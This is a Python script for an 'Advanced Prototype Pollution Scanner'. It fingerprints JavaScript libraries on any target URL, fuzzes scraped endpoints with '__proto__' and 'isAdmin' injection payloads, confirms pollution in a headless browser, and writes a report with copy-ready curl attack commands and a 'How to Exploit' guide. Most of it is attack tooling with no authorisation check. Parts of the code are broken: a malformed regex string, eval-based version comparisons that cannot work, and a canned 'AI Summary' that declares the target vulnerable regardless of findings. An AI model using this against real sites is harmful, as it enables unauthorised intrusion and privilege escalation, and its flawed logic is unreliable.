from colorama import init, Fore, Style
init(autoreset=True)

import requests, re, os, uuid, random, time
from urllib.parse import urljoin, urlencode
from playwright.sync_api import sync_playwright
from bs4 import BeautifulSoup
from jinja2 import Template
from tqdm import tqdm
from itertools import product

# === ADVANCED CONFIGURATION ===
HEADERS = {"Content-Type": "application/json"}
FUZZ_PATHS = ["/api/", "/config", "/v1", "/debug", "/data", "/search", "/submit", "/settings", "/merge", "/xhr", "/post", "/ajax", "/store"]
METHODS = ["GET", "POST"]
ADVANCED_PAYLOADS = [
    {"__proto__": {"polluted": "true"}},
    {"constructor": {"prototype": {"polluted": "true"}}},
    {"__proto__.polluted": "true"},
    {"__proto__[polluted]": "true"},
    {"a[b][__proto__][isAdmin]": True},
    {"constructor.prototype.isAdmin": True},
    {"__pr\u006fto__": {"toString": "alert(1)"}}
]

# === CVE DATABASE EXTENDED ===
LIB_VULNS = {
    "lodash": {"versions": ["<4.17.13", "<4.17.21"], "payloads": ADVANCED_PAYLOADS, "cves": ["CVE-2018-3721", "CVE-2019-10744"]},
    "jquery": {"versions": ["<3.4.0"], "payloads": ADVANCED_PAYLOADS, "cves": ["CVE-2020-11022", "CVE-2020-11023"]},
    "underscore": {"versions": ["<1.12.1"], "payloads": ADVANCED_PAYLOADS, "cves": ["CVE-2021-23358"]},
    "handlebars": {"versions": ["<4.7.7"], "payloads": ADVANCED_PAYLOADS, "cves": ["CVE-2021-23369"]},
    "vue": {"versions": ["<2.6.10"], "payloads": ADVANCED_PAYLOADS, "cves": ["CVE-2020-12277"]}
}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
<meta charset=\"UTF-8\">
<title>Prototype Pollution Scanner Report</title>
<style>
body { font-family: sans-serif; background: #111; color: #eee; padding: 20px; }
h1 { color: #ff4081; }
h2 { margin-top: 30px; }
code { background: #222; padding: 4px 6px; border-radius: 5px; }
pre { background: #1e1e1e; padding: 12px; border-radius: 10px; overflow-x: auto; }
.success { color: #00ff99; }
.vuln { color: #ff5c5c; font-weight: bold; }
button { margin-top: 5px; background: #444; color: #fff; padding: 6px 10px; border: none; border-radius: 6px; cursor: pointer; }
button:hover { background: #666; }
</style>
<script>
function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => {
    alert(\"Copied to clipboard!\");
  });
}
</script>
</head>
<body>
<h1>🧬 Pollution Scan Report</h1>
<p><strong>Target:</strong> {{ target }}</p>

<h2>🛠️ Detected JS Libraries</h2>
<ul>
{% for lib in libs %}
  <li><code>{{ lib.name }} {{ lib.version }}</code>
  {% if lib.vulnerable %}
    <span class=\"vuln\">(Vulnerable - {{ lib.cves | join(', ') }})</span>
  {% endif %}
  </li>
{% endfor %}
</ul>

<h2>🚨 Confirmed Polluted Properties</h2>
{% if polluted %}
  <ul>{% for prop in polluted %}
    <li class=\"success\"><code>{{ prop }}</code></li>
  {% endfor %}</ul>
{% else %}
  <p>No prototype pollution detected in runtime.</p>
{% endif %}

<h2>🧪 Payloads Used</h2>
{% for payload in payloads %}
<div style=\"margin-bottom: 12px;\">
  <pre>{{ payload | tojson }}</pre>
  <button onclick=\"copyToClipboard(`curl -X POST '{{ target }}/api/config' -H 'Content-Type: application/json' -d '{{ payload | tojson }}'`)\">📋 Copy curl</button>
</div>
{% endfor %}

<h2>💥 Exploitation Guide</h2>
{% for lib in libs if lib.vulnerable %}
<pre>
Vulnerability: Prototype Pollution via {{ lib.name }}

CVE(s): {% for cve in lib.cves %}{{ cve }} [<span style=\"color:#ff9933;\">CVSS 7.5 - HIGH</span>]{% if not loop.last %}, {% endif %}{% endfor %}
Detected Version: {{ lib.version }}

Description:
{{ lib.name }} versions {{ lib.version }} allow attackers to modify the global Object prototype by injecting keys like \"__proto__\" or \"constructor.prototype\" into deeply merged inputs.

How to Exploit:
1. Inject this payload into a vulnerable API:
   {{ lib.payloads[0] }}

2. Trigger code that uses deep merge functions like:
   - lodash.merge(), _.defaultsDeep(), jQuery.extend()

3. Open console:
   console.log({}.polluted); // Returns: \"true\"

Impact:
- Escalate privileges (e.g., isAdmin bypass)
- Poison global object properties
- Potential RCE in some backend integrations

Mitigation:
- Upgrade {{ lib.name }} to patched version
- Sanitize inputs: block [\"__proto__\", \"constructor\", \"prototype\"]
- Use secure libraries for deep object manipulation

CVE References:
{% for cve in lib.cves %}
- <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name={{ cve }}\" target=\"_blank\">{{ cve }}</a>
{% endfor %}
</pre>
{% endfor %}

<h2>🧠 AI Summary</h2>
<pre>
This scan revealed one or more vulnerable JavaScript libraries that expose the application to prototype pollution attacks.

Confirmed polluted properties suggest that global JavaScript objects were successfully manipulated. This type of vulnerability can lead to privilege escalation, logic bypass, and unexpected application behavior.

Immediate remediation is strongly advised. Update affected libraries, sanitize incoming JSON keys, and perform security testing on APIs accepting complex object input.
</pre>

</body>
</html>
"""

# === ADVANCED LIB DETECTOR ===
def detect_js_libs(page_source):
    soup = BeautifulSoup(page_source, "html.parser")
    scripts = [s.get("src") for s in soup.find_all("script") if s.get("src")]
    detected = []
    for src in scripts:
        for lib in LIB_VULNS:
            if lib in src:
                match = re.search(r"(\d+\.\d+\.\d+)", src)
                version = match.group(1) if match else "unknown"
                vuln = any(eval(f"'{version}' < '{v}'") for v in LIB_VULNS[lib]["versions"])
                detected.append({"name": lib, "version": version, "vulnerable": vuln, "cves": LIB_VULNS[lib]["cves"] if vuln else [], "payloads": LIB_VULNS[lib]["payloads"]})
    return detected

# === ADVANCED ENDPOINT DISCOVERY (STATIC + JS PARSE) ===
def discover_paths(base_url):
    print(f"{Fore.CYAN}[*] Discovering endpoints via JS scraping and heuristics...")
    try:
        r = requests.get(base_url, timeout=10)
        soup = BeautifulSoup(r.text, "html.parser")
        scripts = [s.get("src") for s in soup.find_all("script") if s.get("src") and base_url in s.get("src")]
        endpoints = set(FUZZ_PATHS)
        for src in scripts:
            js_resp = requests.get(src)
            matches = re.findall(r"(/[^"'\s]{3,40})", js_resp.text)
            for m in matches:
                if any(x in m for x in ["api", "cfg", "set", "post", "merge", "data", "config"]):
                    endpoints.add(m)
        return list(endpoints)
    except Exception as e:
        print(f"{Fore.RED}[!] Endpoint discovery failed: {e}")
        return FUZZ_PATHS

# === FUZING & WAF DETECTION ===
def send_payloads(target, payloads, paths):
    payload_jobs = list(product(paths, payloads, METHODS))
    print(f"{Fore.MAGENTA}[*] Launching payload fuzzing on discovered endpoints...")

    for path, payload, method in tqdm(payload_jobs, desc="Fuzzing payloads", colour="green"):
        url = urljoin(target, path)
        try:
            if method == "GET":
                r = requests.get(url, params=payload, timeout=5)
            else:
                r = requests.post(url, json=payload, headers=HEADERS, timeout=5)
            if r.status_code in [403, 429, 503] or 'waf' in r.headers.get("Server", "").lower():
                print(f"{Fore.YELLOW}[!] WAF or rate-limit suspected on {url}")
                continue
            print(f"{Fore.GREEN}[+] {method} {r.url} -> {r.status_code}")
        except Exception as e:
            print(f"{Fore.RED}[!] {method} {url} failed: {e}")

# === RUNTIME CONFIRMATION ===
def browser_check(target):
    polluted = []
    print(f"{Fore.MAGENTA}[*] Launching browser to confirm runtime pollution...")
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        try:
            page.goto(target, timeout=10000)
            keys = page.evaluate("""
                () => {
                    let found = [];
                    for (let k in {}) {
                        if (["polluted", "isAdmin", "x"].includes(k)) found.push(k);
                    }
                    return found;
                }
            """)
            for k in keys:
                print(f"{Fore.CYAN}[+] Found polluted property: {Fore.LIGHTGREEN_EX}{k}")
                polluted.append(k)
        except Exception as e:
            print(f"{Fore.RED}[!] Browser error: {e}")
        finally:
            browser.close()
    return polluted

# === REPORT ===
def write_report(target, libs, polluted, payloads):
    fname = f"pollution_report_{uuid.uuid4().hex[:6]}.html"
    html = Template(HTML_TEMPLATE).render(target=target, libs=libs, polluted=polluted, payloads=payloads)
    with open(fname, "w") as f:
        f.write(html)
    print(f"{Fore.LIGHTBLUE_EX}[+] HTML report written: {fname}")
    os.startfile(fname) if os.name == 'nt' else os.system(f"open {fname}")

# === MAIN ===
if __name__ == "__main__":
    print(f"{Fore.CYAN}==🧠 Advanced Prototype Pollution Scanner ==")
    target = input("Enter target URL (e.g., https://example.com): ").strip()
    if not target.startswith("http"):
        target = "http://" + target

    print(f"{Fore.YELLOW}[*] Fetching homepage and detecting libraries...")
    try:
        r = requests.get(target, timeout=10)
        libs = detect_js_libs(r.text)
        for lib in libs:
            if lib["vulnerable"]:
                print(f"{Fore.YELLOW}[+] Detected JS lib: {lib['name']} {lib['version']} ({Fore.RED}VULNERABLE{Fore.YELLOW})")
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to fetch target: {e}")
        libs = []

    all_payloads = []
    for lib in libs:
        if lib["vulnerable"]:
            all_payloads.extend(lib["payloads"])

    if not all_payloads:
        all_payloads = ADVANCED_PAYLOADS

    discovered_paths = discover_paths(target)
    send_payloads(target, all_payloads, discovered_paths)
    polluted_props = browser_check(target)
    write_report(target, libs, polluted_props, all_payloads)
